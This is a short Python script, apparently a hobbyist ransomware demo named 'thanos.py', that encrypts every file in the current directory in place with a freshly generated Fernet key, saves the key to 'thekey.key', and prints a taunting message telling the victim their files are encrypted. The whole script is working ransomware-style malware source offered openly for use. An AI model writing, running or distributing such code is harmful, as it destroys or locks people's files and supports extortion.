#!/usr/bin/env python3

# SCRIPT CODED BY SHEHAN SULAKSHANA
# FOLLOW ME ON GITHUB & IF YOU ARE SATISFIED, STAR MY REPOSITORIES ❤️


import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir("."):
	if file == "thanos.py" or file =="thekey.key" or file == ".thanos.py.swp" or file == "ironman_dec.py":
		continue
	if os.path.exists(file):
		files.append(file)

key = Fernet.generate_key()
cipher_suite = Fernet(key)

with open("thekey.key","wb") as keyfile:
	keyfile.write(key)


for file in files:
	with open(file,"rb") as con_file:
		content = con_file.read()

	with open(file,"wb") as enc_file:
		enc_content = cipher_suite.encrypt(content)
		enc_file.write(enc_content)


print ("[***] HA HAAA....YOUR FILES ARE ENCRYPTED :) ,GOOD LUCK WITH THE DECRYPTION 😂 ") 
